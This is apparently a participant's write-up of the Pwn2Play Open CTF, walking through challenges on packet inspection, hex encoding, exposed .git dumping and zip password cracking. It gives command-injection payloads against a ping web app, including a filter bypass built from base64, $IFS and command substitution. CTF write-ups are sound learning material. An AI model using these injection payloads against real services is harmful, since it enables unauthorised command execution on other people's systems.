# Pwn2Play Open CTF
Sat, 30 May 2026, 09:00 UTC — Sat, 30 May 2026, 18:00 UTC

**Links**
- CTFtime: <https://ctftime.org/event/3220>
- Official URL: <https://pwn2play.biterra.co/>


# My facilities
<img width="1544" height="622" alt="2026-05-31-01:19:28" src="https://github.com/user-attachments/assets/d585b8ae-474b-4d61-9427-6bef42166795" />



# Challenge page

<img width="2431" height="1326" alt="2026-05-30-11:02:42" src="https://github.com/user-attachments/assets/c84501b1-2028-4629-9131-2a036af18261" />


# The Hello Packet
**Objective**
- A suspicious device on the network sent a single "Heartbeat" packet. We captured it in a file named heartbeat.pcap. Find the hidden message inside the packet's payload to get the flag.


We download the `pcap` and open it up with `Wireshark`, there's a single UDP packet waiting for us with the secret data:

<img width="1603" height="681" alt="2026-05-30-11:17:12" src="https://github.com/user-attachments/assets/d9149810-c6e1-42d4-9489-391e330e4a55" />

<img width="656" height="256" alt="2026-05-30-11:19:48" src="https://github.com/user-attachments/assets/48d5afb1-6b33-4641-b87a-a50669a0d871" />


-------------------


# Hex Checkpoint
**Objective**
- Convert the ASCII string "Hi" into lowercase hexadecimal and submit the bytes with no spaces.

This one was pretty simple:
```bash
❯❯ echo -n "Hi" | xxd                   
00000000: 4869                                     Hi
```
The -n flag omits newlines!

<img width="667" height="255" alt="2026-05-30-11:37:52" src="https://github.com/user-attachments/assets/c31004ec-51f2-48b9-8d66-c6a55d19a06c" />



-------------



# Ping Of The Hill
**Description**
- This web app generously allows you to ping random targets, because what could possibly go wrong?

**Objective**
- Use an exploit to extract the contents of flag.txt hosted on the local disk.


<img width="1350" height="793" alt="2026-05-30-13:47:58" src="https://github.com/user-attachments/assets/a4919a4c-98e3-42c9-a51e-712b66b84fb1" />

We simply chain a command after specifying the IP address. I started of with some basics like `pwd` and `ls` to get a feel of what's what, and eventually found the flag:
```bash
1.1.1.1 ; find / -type f -name flag.txt
1.1.1.1 ; cat /tmp/flag.txt
```
<img width="1257" height="782" alt="2026-05-30-14:01:57" src="https://github.com/user-attachments/assets/27854823-ab26-49a8-a4cd-c26a38553b49" />


-----------------



# I Got to Git That Flag
**Description**
- Someone pushed a little too much to production.

The link in the challenge takes us to a blog site:

<img width="1347" height="933" alt="2026-05-30-15:04:59" src="https://github.com/user-attachments/assets/647c21e9-2213-493a-b6f9-8334d9f91107" />


I found a `.git` directory using `ffuf` and `curl`ed a crumble:
```bash
❯❯ curl https://gotgitapp.pwn2play.com/.git/config
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[user]
	name = CTF Dev
	email = ctf.dev@example.local


❯❯ curl https://gotgitapp.pwn2play.com/.git/HEAD  
ref: refs/heads/main
```

I needed more, so I googled how to extract git information:

<img width="1408" height="897" alt="2026-05-30-15:06:11" src="https://github.com/user-attachments/assets/9d86b057-1e7e-406a-ae31-09112cd3d68f" />

The [tool](<https://github.com/arthaud/git-dumper>) can be found in the `Arch User Repository`. I'm using `yay` as the AUR helper:
```
❯❯ yay -S git-dumper-git
❯❯ git-dumper <url> <output>
```
<img width="1696" height="167" alt="2026-05-30-15:14:48" src="https://github.com/user-attachments/assets/ed08de88-1654-43d8-a116-87dcfe1fff34" />


Found some interesting stuff!

<img width="1128" height="716" alt="2026-05-30-15:14:30" src="https://github.com/user-attachments/assets/ec0780de-9cda-443f-8cd8-dcb162346c6b" />


You can clearly see which commit we're after, let's go get it!
```bash
❯❯ git show e43008d2bd3105119649f0e5bde066c2a2f41dfb
```
<img width="1318" height="548" alt="2026-05-30-15:19:38" src="https://github.com/user-attachments/assets/134a980a-5419-42b5-b2bb-99649ab8275c" />

Funny thing is I just did this kind of exercise yesterday right before I completed OverTheWire's `Bandit`, so it was fresh in memory LOL

<img width="660" height="311" alt="2026-05-30-15:20:18" src="https://github.com/user-attachments/assets/ab691976-76e2-4e02-ac2b-17130fdc4621" />



-------------



# Ping Of The Hill II just dropped!
<img width="667" height="352" alt="2026-05-30-15:24:25" src="https://github.com/user-attachments/assets/5c8eafaf-9906-40f9-a29b-d1c9d1b3e23c" />


No more low hanging fruit :/ -->

<img width="1251" height="723" alt="2026-05-30-15:23:52" src="https://github.com/user-attachments/assets/f6e71389-8c81-4db1-aa59-dabf39e84898" />


I tried a loooot of stuff, but we're here for the loot, so let's get down to the solution!

The filter is not letting quotes, spaces, and certain commands through etc. 
How do I know this? Because in the previous Ping of The Hill the `index.php` file was in the working directory and readable, so I went through it. The filters were commented out though, so I already knew then they were gonna drop the second version soon.

So my instinct said to base64 encode the payload:
```bash
❯❯ echo -n "cat /tmp/flag.txt" | base64
Y2F0IC90bXAvZmxhZy50eHQ=
```

Now the only thing left was to execute the payload on the target, the final command then becomes:
```bash
1.1.1.1;$(base64$IFS-d<<<Y2F0IC90bXAvZmxhZy50eHQ=)
```
First we feed the string to `base64`'s standard input using the herestring `<<<`. Once the decoding was solved, the problem was that the shell kept printing the command to stdout, not running it. We solve that with command substitution `$()`. 

The only problem I couldn't solve on my own, was how to get a space between `base64` and `-d`. It wouldn't execute without it. Here I just asked chatGPT "how do I get a space on the CLI without actually typing it". It suggested something weird but mentioned the IFS (Internal Field Separator) variable, which I then used to my advantage. My whole attack was depending on this. The rules of the game was not to use AI, so I let this be the first and last! I was just very much stuck and couldn't find anything useful from my search engine. 



<img width="1222" height="787" alt="2026-05-30-17:40:37" src="https://github.com/user-attachments/assets/ab5e867d-eaec-4854-a042-e2dbc15e5f86" />

<img width="662" height="272" alt="2026-05-30-17:38:09" src="https://github.com/user-attachments/assets/a7ba3892-4321-48c7-bd2c-9610f1e1a39b" />





-------


# Mud on Your Face
<img width="663" height="348" alt="2026-05-30-15:39:33" src="https://github.com/user-attachments/assets/bb2f916b-80ef-4861-bdfd-3aa4a3d1d769" />


Download zip file --> rename --> extract hash
```bash
❯❯ zip2john protected_flag.zip > flag.hash

# Crack it
❯❯ john flag.hash 
```
John was huffing and puffing for about 15 minutes without yielding any results, so I halted the operation and changed the wordlist. And wouldnt you know a second later I had myself a password!

<img width="1508" height="238" alt="2026-05-30-16:11:37" src="https://github.com/user-attachments/assets/b8312bbd-1099-42f6-bcce-b884fa9d5ce1" />

<img width="707" height="160" alt="2026-05-30-16:12:06" src="https://github.com/user-attachments/assets/9e036ca9-58ea-4bcd-bca6-3ea8a92f304f" />

<img width="665" height="260" alt="2026-05-30-16:12:44" src="https://github.com/user-attachments/assets/1e7794b5-7639-4bdd-8711-c396483fd19c" />



----------------



# Result
<img width="311" height="130" alt="2026-05-30-17:38:28" src="https://github.com/user-attachments/assets/485b7b95-0b38-445d-ba56-9e742d1704f8" />


I tried a couple of other challenges as well but didn't have time to complete them. Also there was this one Linux challenge I really wanted to do, but it was hosted at `TryHackMe` and the lab didn't work properly for some reason. My scans weren't going through, so I reset the whole thing, got like 5 minutes of uptime where I could scan it, but then it went down again :/, I did this for a couple of times, but it was taking too much of my focus without any results, so I had to leave that one alone and focus my efforts elsewhere.

But all in all a very nice experience!
